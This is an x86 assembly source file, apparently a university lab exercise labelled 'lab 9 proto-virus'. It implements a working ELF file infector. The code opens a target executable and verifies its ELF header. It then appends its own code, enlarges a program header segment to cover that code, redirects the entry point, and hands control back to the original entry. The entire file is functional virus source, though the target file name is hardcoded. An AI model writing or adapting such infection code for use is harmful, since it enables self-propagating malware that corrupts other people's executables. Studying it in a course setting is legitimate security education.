%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro get_loc 1
	call get_my_loc
	sub dword [ebp - LABEL_OFF],  next_i - %1
%endmacro



%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHD_OFFSET 64
%define FILE_SIZE 68
%define MAGIC1 7
%define MAGIC2 6
%define MAGIC3 5
%define ELFH_STACK_OFF(i) (ELFHD_OFFSET - i)
%define FILE_DESC_OFF 4
%define LABEL_OFF 12
%define MAGIC_OFF 8
%define PHD_OFFSET 104
%define PHD_STACK_OFFSET(i) (PHD_OFFSET - i)
%define ORIG_ENTRY_POINT_OFF 72

	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	

; You code for this lab goes here
	get_loc OutStr
	write 1, [ebp - LABEL_OFF], 32
	get_loc FileName
	open [ebp - LABEL_OFF], RDWR, 0
	cmp eax, -1
	je virus_fail
	mov dword [ebp - FILE_DESC_OFF], eax
	mov dword [ebp - MAGIC_OFF], 0
	lea ecx, [ebp - MAGIC_OFF]
	read [ebp - FILE_DESC_OFF], ecx, 4
	mov al, byte [ebp - MAGIC1]
	cmp al, 'E'
	jne virus_fail
	mov al, byte [ebp - MAGIC2]
	cmp al, 'L'
	jne virus_fail
	mov al, byte [ebp - MAGIC3]
	cmp al, 'F'
	jne virus_fail

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_END
	mov dword [ebp - FILE_SIZE], eax
	get_loc _start
	mov ecx, [ebp - LABEL_OFF]
	get_loc virus_end
	mov edx, [ebp - LABEL_OFF]
	sub edx, ecx
	sub edx, 4
	write [ebp - FILE_DESC_OFF], ecx, edx

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_OFFSET]
	read [ebp - FILE_DESC_OFF], ecx, 52

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_END
	lea ecx, [ebp - ELFH_STACK_OFF(ENTRY)]
	write [ebp - FILE_DESC_OFF], ecx, 4


	mov ecx, [ebp - ELFH_STACK_OFF(PHDR_start)]
	lseek [ebp - FILE_DESC_OFF], ecx, SEEK_SET
	lea ecx, [ebp - PHD_OFFSET]
	read [ebp - FILE_DESC_OFF], ecx, PHDR_size


	mov eax, dword [ebp - PHD_STACK_OFFSET(PHDR_vaddr)]
	mov dword [ebp - ORIG_ENTRY_POINT_OFF], eax

	lea ecx, [ebp - PHD_OFFSET]
	read [ebp - FILE_DESC_OFF], ecx, PHDR_size

	mov ecx, [ebp - FILE_SIZE]
	get_loc virus_end
	add ecx, dword [ebp - LABEL_OFF]
	get_loc _start
	sub ecx, dword [ebp - LABEL_OFF]
	sub ecx, dword [ebp - PHD_STACK_OFFSET(PHDR_offset)]
	mov dword [ebp - PHD_STACK_OFFSET(PHDR_filesize)], ecx
	mov dword [ebp - PHD_STACK_OFFSET(PHDR_memsize)], ecx

	mov ecx, dword [ebp - ELFH_STACK_OFF(PHDR_start)]
	add ecx, PHDR_size
	lseek [ebp - FILE_DESC_OFF], ecx, SEEK_SET
	lea ecx, [ebp - PHD_OFFSET]
	write [ebp - FILE_DESC_OFF], ecx, 32

	mov eax, dword [ebp - FILE_SIZE]
	add eax, dword [ebp - ORIG_ENTRY_POINT_OFF]
	mov dword [ebp - ELFH_STACK_OFF(ENTRY)], eax
	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_OFFSET]
	write [ebp - FILE_DESC_OFF], ecx, 52


	close [ebp - FILE_DESC_OFF]

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

virus_fail:
	get_loc Failstr
	write 1, [ebp - LABEL_OFF], 13

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop dword [ebp - LABEL_OFF]
	ret
	
PreviousEntryPoint: dd VirusExit
virus_end:


